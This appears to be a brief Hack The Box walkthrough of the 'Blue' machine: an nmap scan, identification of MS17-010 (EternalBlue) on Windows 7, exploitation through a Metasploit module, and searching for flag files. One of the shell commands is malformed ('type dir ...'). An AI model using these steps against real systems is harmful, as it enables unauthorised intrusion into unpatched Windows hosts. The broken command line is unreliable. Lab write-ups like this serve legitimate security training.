---
title: BLUE
description: Exploitation of the eternal blue vuln
date: 2026-09-21T04:22:40.000Z
category: htb
tags:
  - windows
  - metasploit
  - eternalblue
difficulty: easy
os: Windows
---

## Enumeration
Add the ip to hosts:
```bash
echo "10.10.10.10     blue.htb" | sudo tee -a /etc/hosts
```
Run an initial Nmap scan:

```bash
nmap -sC -sV  blue.htb
```

### Open ports 

| port    | service      |
| ------- | ------------ |
| 445/tcp | microsoft-ds |
| 135/tcp | msrpc        |
| 139/tcp | netbios-ssn  |
|         |              |
The 445 service version is Windows 7 Proffesional 7601 Service PAck 1 microsoft-ds 
A quick google search we find out its vulnerable to the eternal blue vuln`MS17-010`
## Foothold
```bash
msfconsole
search eternalblue 
use 0
```
set the necessary options 
`run`
then shell
```cmd
dir C:\ /s /b | findstr /i "user.txt"
dir C:\ /s /b | findstr /i "root.txt"

type dir C:\ /s /b | findstr /i "user.txt"
dir C:\ /s /b | findstr /i "root.txt"
```
